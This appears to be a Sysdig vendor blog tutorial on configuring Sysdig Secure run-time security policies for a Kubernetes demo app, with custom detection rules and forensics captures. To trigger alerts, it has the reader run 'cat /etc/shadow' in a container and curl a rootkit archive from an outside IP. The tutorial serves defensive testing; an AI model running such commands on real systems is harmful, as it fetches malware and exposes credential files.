---
ID: 5244
post_title: >
  Sysdig Secure, Docker native run-time
  security
author: Mateo Burillo
post_excerpt: ""
layout: post
permalink: >
  https://sysdigrp2rs.wpengine.com/blog/sysdig-secure-docker-run-time-security/
published: true
post_date: 2017-11-13 13:03:07
---
The veil has lifted! <a href="https://sysdigrp2rs.wpengine.com/product/secure/" target="_blank">Sysdig Secure</a> was officially launched last month. Now the Sysdig commercial offering includes run-time security for Docker and microservices. Natively integrated with key container orchestration technologies like Kubernetes, Docker Swarm, OpenShift, Mesos and AWS.

This article is intended to be a hands-on walkthrough over the multiple features and security policies available in Sysdig Secure. We will start from a simple use case scenario, configure different security rules and also play the attacker’s role to check their effectiveness.

Let’s start by describing our barebones containers & microservices app. [tweet_box design="default" float="none"]How to implement #Docker run-time #security policies for #microservices with Sysdig Secure[/tweet_box] 

## Implementing security on Docker’s example-voting app {#implementingsecurityondockersexamplevotingapp}

Our scenario is based on the famous Docker’s example-voting-app. You can follow the examples verbatim, or just adapt to your own test scenario, the rules are easily transposed or adapted, as you will see.

Assuming you have a working Kubernetes cluster, a Sysdig Secure account (if not request a <a href="https://go.sysdigrp2rs.wpengine.com/sysdig-secure-trial" rel="noopener" target="_blank">free trial here</a>!) and the latest version of the Sysdig agent is already installed on your hosting nodes, let’s spawn our Kubernetes application:

    $ git clone https://github.com/mateobur/k8s-example-voting-app

And apply the yaml files inside in the correct order:

    $ kubectl create namespace example-voting-app
    $ kubectl create -f redis-deployment.yaml --namespace example-voting-app
    $ kubectl create -f redis-service.yaml --namespace example-voting-app
    $ kubectl create -f db-deployment.yaml --namespace example-voting-app
    $ kubectl create -f db-service.yaml --namespace example-voting-app
    $ kubectl create -f vote-deployment.yaml --namespace example-voting-app
    $ kubectl create -f vote-service.yaml --namespace example-voting-app
    $ kubectl create -f result-deployment.yaml --namespace example-voting-app
    $ kubectl create -f result-service.yaml --namespace example-voting-app
    $ kubectl create -f worker-deployment.yaml --namespace example-voting-app
    $ kubectl create -f voter-deployment.yaml --namespace example-voting-app
    $ kubectl create -f observer-deployment.yaml --namespace example-voting-app

After a little while you should get something similar to this:

    $ kubectl get pods --namespace=example-voting-app
    NAME                        READY     STATUS    RESTARTS   AGE
    db-2126407132-0vg1l         1/1       Running   0          3m
    observer-3672908794-5h038   1/1       Running   0          3m
    redis-3428806732-7czrw      1/1       Running   0          3m
    result-1567690240-1k0v7     1/1       Running   0          3m
    result-1567690240-gt94p     1/1       Running   0          3m
    result-1567690240-h9sg1     1/1       Running   0          3m
    vote-2167306898-qmcjl       1/1       Running   0          3m
    voter-1072368459-rjzwh      1/1       Running   0          3m
    worker-3500885906-l28vm     1/1       Running   0          3m

You can directly point your browser to the “vote” or “result” services. The “voter” container will automatically generate traffic for you in any case.

## Sysdig’s approach to Docker and microservices run-time security {#sysdigsapproachtodockerandmicroservicesruntimesecurity}

Once you log in Sysdig Secure your will find an infrastructure overview, much like the *Explore* tab in <a href="https://sysdigrp2rs.wpengine.com/product/monitor/" target="_blank">Sysdig Monitor</a>. In the same fashion, you can configure the grouping: physical nodes, containers, Kubernetes deployments, etc.

[<img src="https://sysdigrp2rs.wpengine.com/wp-content/uploads/2017/11/sysdig_secure_overview.png" alt="Sysdig docker security overview" width="384" height="244" class="alignleft size-full wp-image-5281" />][1]   
  
The number you see on the right corresponds to the security events that happened during the time frame you selected. You have three options to display these events.

As a feed style list of events:

[<img src="https://sysdigrp2rs.wpengine.com/wp-content/uploads/2017/11/sysdig_secure_feed.png" alt="Sysdig microservice security feed" width="710" height="339" class="alignleft size-full wp-image-5280" />][2]   
  
Totals events by different groupings:

[<img src="https://sysdigrp2rs.wpengine.com/wp-content/uploads/2017/11/sysdig_secure_groupings.png" alt="Secure microservice groups alerts" width="872" height="505" class="alignleft size-full wp-image-5279" />][3]   
  
As a node/container or app/services topology map:

[<img src="https://sysdigrp2rs.wpengine.com/wp-content/uploads/2017/11/sysdig_secure_topology.png" alt="Security container topology" width="712" height="553" class="alignleft size-full wp-image-5278" />][4]   
  
Notice the elements are color-coded, the entities have a green background in this example because there are no security events in the time window I selected.

## Testing Sysdig Secure default container security ruleset {#testingsysdigsecuredefaultcontainersecurityruleset}

If you click on the *Policies* tab at the top, you will see a wealth of pre populated default security policies, like:

*   FILE POLICY: Write below binary dir: an attempt to write to any file below a set of binary directories.
*   APPLICATION POLICY: DB program spawned process: a database-server related program spawned a new process other than itself. This shouldn't occur and is a follow on from some SQL injection attacks.
*   MALICIOUS ACTIVITY: 
    *   Run shell untrusted: an attempt to spawn a shell by a non-shell program. Exceptions are made for trusted binaries.
    *   Installer bash starts network server: an attempt by a program in a pipe installer session to start listening for network connections.
*   CONTAINER POLICY: Unexpected privileged container launched in prod namespace.

These policies have been designed to cover the most common container-related security threats, but of course you can adapt them to your scenario disabling some of them, modifying others and creating your own policies from scratch.

This is the basic anatomy of a policy:

[<img src="https://sysdigrp2rs.wpengine.com/wp-content/uploads/2017/11/sysdig_secure_example_topology.png" alt="Sysdig secure example policy" width="1699" height="903" class="alignleft size-full wp-image-5266" />][5]   
  
You can classify them into several *Severity* levels, set an *Scope* using for example Kubernetes metadata (namespaces, deployment, pods, etc). This specific rule fires if there is any write operation under the `/etc` directory, we will comment about the internal rule syntax later on in this article.

There are several *Actions* that you can perform once the alert is fired: 
*   Stop the container
*   Pause the container
*   and/or create a capture file for deeper inspection and forensics

You can also notify using the usual *Notification* channels: mail, PagerDuty, webhooks, SNS, Slack, etc.

Let’s fire this rule:

    $ kubectl exec -it result-1567690240-vxcdj --namespace=example-voting-app sh
    # touch /etc/foo

Immediately, the pod will be killed and you will be expelled from the shell.

You will be able to see the following events in your stream:

[<img src="https://sysdigrp2rs.wpengine.com/wp-content/uploads/2017/11/shell_in_container.png" alt="Docker security shell in container" width="742" height="132" class="alignleft wp-image-5277" />][6]   
  
You can see the square symbol representing that the container has been stopped. It also detects the interactive shell we have spawned.

Let’s try another policy:

    $ kubectl exec -it result-1567690240-vxcdj --namespace=example-voting-app sh
    # cat /etc/shadow  

Will prompt this event:

[<img src="https://sysdigrp2rs.wpengine.com/wp-content/uploads/2017/11/read_sentitive_event.png" alt="Reading secure file" width="1085" height="102" class="alignleft size-full wp-image-5276" />][7]   
  
If you click on it, you can read the specific detail of what actually happened in your container:

*Details Sensitive file opened for reading by non-trusted program (user=root name=cat command=cat /etc/shadow file=/etc/shadow)*

You can click on the *View commands* button to get a list of the user commands associated with the event.

Take a minute to read the default policies, you can probably reuse or adapt most of them and you will also get some initial ideas about creating your own policies.

## Creating your own Docker security policy: rules and patterns {#creatingyourowndockersecuritypolicyrulesandpatterns}

Whitelisting (forbidding everything by default and then explicitly list allowed items) is not always possible or practical, but when it is, it’s a extremely useful security tool, since it offers a level of protection against threats you have not even planned for.

The containers and microservices paradigm make whitelisting much more straightforward. Containers are, by design, simple machines with few moving parts. Let’s use this trait to our advantage and create some custom policies!

### Container process security {#containerprocesssecurity}

Logging in your ‘worker’ container or inspecting its contents, you will realize it only needs to execute:

    java -jar target/worker-jar-with-dependencies.jar
    

That’s the entrypoint and that’s all that this container does. Any other process in execution would be extremely suspicious.

Click on the *Policies* tab, and click on the *Add Policy* button:

[<img src="https://sysdigrp2rs.wpengine.com/wp-content/uploads/2017/11/secure_new_policy-1.png" alt="Docker security policy" width="2464" height="952" class="alignleft size-full wp-image-5390" />][8]   
  
*   We write a *Name* and *Description* for this alert.
*   This event is critical enough to set the *Severity* to High.
*   We configure the *Scope* to apply to our Kubernetes namespace, only to pods in this specific deployment.
*   We will edit our own rule in the next step, just wait for it :).
*   For the action, again, we consider this event serious enough to stop the container, we should probably create a capture file as well, but let’s keep things simple for now.
*   Finally, we configure email as our preferred notification channel for this policy.

Now if you click on *Edit Rules* you will be able to read the text version of the default Sysdig Secure policies on the right side, and write your own rules on the left side editor.

A detailed <a href="https://github.com/draios/falco/wiki" target="_blank">description of the rule syntax</a> is available on Sysdig Falco wiki, but the ones we are going to show are quite self-explanatory. On this case:

    - rule: Unauthorized process running in worker container
      desc: There is a process running in the worker container that is not described in the template
      condition: spawned_process and not proc.name in (java)
      output: Unauthorized process (%proc.cmdline) running in (%container.id)
      priority: ERROR
    

This rule will fire if there is a process different than `java` (condition). The output will be parametrized with the command line and container id involved in this alert.

Save this rule, choose this rule for the policy as shown in the example above, make sure the rule is enabled and save the policy.

Spawn a shell in the worker container and write a command like `ls`. The `ls` process is not in the list and the container will be stopped:

[<img src="https://sysdigrp2rs.wpengine.com/wp-content/uploads/2017/11/secure_unathorized_process.png" alt="Unauthorized Docker service" width="1078" height="75" class="alignleft size-full wp-image-5275" />][9]   
  
If you click on this item you will see the detail we configured in the rule:

*Unauthorized process (ls ) running in (2cb4ccc1f783)*

### Container file access policy {#container-file-access-policy}

Containers should only write in a small set of variable data directories, most of the files of a container are typically static.

[<img src="https://sysdigrp2rs.wpengine.com/wp-content/uploads/2017/11/secure_write_to_nonwrittable-1.png" alt="Docker policy write" width="2470" height="951" class="alignleft size-full wp-image-5391" />][10]   
  
This time, we are only going to notify, we don’t want to stop the container if some process writes a logfile we didn’t expect, for example.

First, we are going to declare a macro defining allowed directories:

    - macro: writable_data_dir
      condition: evt.arg[1] startswith /data or evt.arg[1] startswith /dev/tty or evt.arg[1] startswith /root
    

The `/data` directory is used by redis, we allow the other two to avoid firing the alarm while spawning a shell.

And the rule itself:

    - rule: Write to non writable dir
      desc: attempt to write to directories that should be immutable
      condition: open_write and not writable_data_dir
      output: "Writing to non writable dir (user=%user.name command=%proc.cmdline file=%fd.name)"
      priority: ERROR
    

Any `open_write` event for a directory not contained in the last macro should fire the alarm.

Let’s try it:

    $ kubectl exec -it redis-3428806732-dl3f3 --namespace=example-voting-app sh
    /data # touch foo
    /data # touch /var/foo
    

You should be able to find this event and description in your stream:

[<img src="https://sysdigrp2rs.wpengine.com/wp-content/uploads/2017/11/secure_write_to_nonwrittable_event.png" alt="Secure write to non writtable" width="1083" height="92" class="alignleft size-full wp-image-5274" />][11]   
  
*Writing to non writable dir (user=root command=touch /var/foo file=/var/foo)*

### Container network security {#container-network-security}

Inbound and outbound connections have also a very delimited specification in microservices infrastructure. Even if you have firewalling in place, you want to get notifications when unexpected connections are attempted, as this is usually the first symptom of a security break in.

Our ‘result’ containers just need to connect to the PostgreSQL database and wait for connections in the HTTP (80) port.

    ss -aut
    tcp   ESTAB      0      0     10.44.0.3:42862       10.106.140.89:postgresql
    tcp   LISTEN     0      128   :::http               :::*
    

If you want to receive an alert on unexpected outbound traffic you can write a rule similar to this one:

    - rule: Unauthorized outbout connection
      desc: Container opened an unexpected connection to foreign host
      condition: outbound and fd.sport != 5432
      output: Unauthorized outbout connection (connection=%fd.name)
      priority: WARNING

We are going to create a policy similar to the other two using this new rule, but let’s enable the Sysdig capture this time:

[<img src="https://sysdigrp2rs.wpengine.com/wp-content/uploads/2017/11/create_inspect_capture.png" alt="Create Sysdig Inspect capture" width="500" height="400" class="alignleft size-full wp-image-5273" />][12]   
  
This capture includes every system call and kernel event making it an extremely powerful <a href="https://sysdigrp2rs.wpengine.com/blog/fishing-for-hackers/" target="_blank">container forensics</a> and <a href="https://sysdigrp2rs.wpengine.com/blog/the-big-oom-theory/" target="_blank">container troubleshooting</a> data source.

Log into any ‘result’ container and download malicious code

    curl --insecure https://198.84.60.200/UNIX/penetration/rootkits/vlany-master.tar.gz -o vlany-master.tar.gz
    

You will receive an alert event like this:

[<img src="https://sysdigrp2rs.wpengine.com/wp-content/uploads/2017/11/outbound_connection_alert-1024x87.png" alt="Docker Security outbound connection" width="1024" height="87" class="alignleft size-large wp-image-5339" />][13]   
  
Note the blue capture icon associated with this specific alert.

If you click on the *Captures* tab, you will be able to browse every capture file associated with this or any other rule.

[<img src="https://sysdigrp2rs.wpengine.com/wp-content/uploads/2017/11/sysdig_inspect_docker_capture_file.png" alt="Sysdig Inspect docker security capture" width="1102" height="88" class="alignleft size-full wp-image-5342" />][14]   
  
From right to left, you can delete the capture file, download it to your computer, see the associated event, or directly open it on <a href="https://sysdigrp2rs.wpengine.com/blog/sysdig-inspect/" target="_blank">Sysdig Inspect</a> (the orange shovel icon).

### Post-mortem analysis on containers and Docker forensics {#postmortemanalysisoncontainersanddockerforensics}

Once you click on the shovel icon, you will be presented to an interface similar to this one:

[<img src="https://sysdigrp2rs.wpengine.com/wp-content/uploads/2017/11/sysdig_inspect_overview.png" alt="Sysdig Inspect overview" width="2500" height="1261" class="alignleft size-full wp-image-5270" />][15]   
  
If you analyze the file operations associated with this event, you can see the actual files that were modified in your system during this attack.

[<img src="https://sysdigrp2rs.wpengine.com/wp-content/uploads/2017/11/docker_security_malware_file2.png" alt="Docker security malware file" width="2162" height="1107" class="alignleft size-full wp-image-5394" />][16] 
## Conclusions {#conclusions}

The container and microservice design patterns brings us the opportunity to write very strict and specific security rules. Same ideas and techniques that we apply to monitoring are now available to design your container-oriented security policies. <a href="https://sysdigrp2rs.wpengine.com/product/secure/" rel="noopener" target="_blank">Sysdig Secure</a> and <a href="https://sysdigrp2rs.wpengine.com/blog/sysdig-inspect/" rel="noopener" target="_blank">Sysdig Inspect</a> demonstrate that a nice interface is not at odds with powerful rules using the maximum resolution available in any Linux system, its system calls.

Get a free <a href="https://go.sysdigrp2rs.wpengine.com/sysdig-secure-trial" target="_blank">Sysdig Secure trial</a> today and start creating your own Docker and microservices native security policies!

 [1]: https://sysdigrp2rs.wpengine.com/wp-content/uploads/2017/11/sysdig_secure_overview.png
 [2]: https://sysdigrp2rs.wpengine.com/wp-content/uploads/2017/11/sysdig_secure_feed.png
 [3]: https://sysdigrp2rs.wpengine.com/wp-content/uploads/2017/11/sysdig_secure_groupings.png
 [4]: https://sysdigrp2rs.wpengine.com/wp-content/uploads/2017/11/sysdig_secure_topology.png
 [5]: https://sysdigrp2rs.wpengine.com/wp-content/uploads/2017/11/sysdig_secure_example_topology.png
 [6]: https://sysdigrp2rs.wpengine.com/wp-content/uploads/2017/11/shell_in_container.png
 [7]: https://sysdigrp2rs.wpengine.com/wp-content/uploads/2017/11/read_sentitive_event.png
 [8]: https://sysdigrp2rs.wpengine.com/wp-content/uploads/2017/11/secure_new_policy-1.png
 [9]: https://sysdigrp2rs.wpengine.com/wp-content/uploads/2017/11/secure_unathorized_process.png
 [10]: https://sysdigrp2rs.wpengine.com/wp-content/uploads/2017/11/secure_write_to_nonwrittable-1.png
 [11]: https://sysdigrp2rs.wpengine.com/wp-content/uploads/2017/11/secure_write_to_nonwrittable_event.png
 [12]: https://sysdigrp2rs.wpengine.com/wp-content/uploads/2017/11/create_inspect_capture.png
 [13]: https://sysdigrp2rs.wpengine.com/wp-content/uploads/2017/11/outbound_connection_alert.png
 [14]: https://sysdigrp2rs.wpengine.com/wp-content/uploads/2017/11/sysdig_inspect_docker_capture_file.png
 [15]: https://sysdigrp2rs.wpengine.com/wp-content/uploads/2017/11/sysdig_inspect_overview.png
 [16]: https://sysdigrp2rs.wpengine.com/wp-content/uploads/2017/11/docker_security_malware_file2.png